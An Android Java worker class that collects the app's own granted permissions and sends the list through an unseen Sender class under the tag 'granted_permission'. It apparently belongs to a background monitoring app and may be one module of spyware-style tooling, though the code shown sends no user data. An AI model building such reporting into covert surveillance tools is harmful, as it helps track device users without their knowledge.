package com.behavioralanalysis.service;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;

public class Permissions extends Worker {
    public static final String TAG = "granted_permission";
    private Context context;
    public Permissions(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            JSONArray array = new JSONArray();

            PackageInfo packageInfo = MainService.getContext().getPackageManager().getPackageInfo(MainService.getContext().getPackageName(), PackageManager.GET_PERMISSIONS);
            for (int i = 0; i < packageInfo.requestedPermissions.length; i++) {
                if ((packageInfo.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) {
                    array.put(packageInfo.requestedPermissions[i]);
                }
            }
            Sender.send(TAG, array.toString());
            return Result.success();
        } catch (Exception e) {
            return Result.failure();
        }
    }
}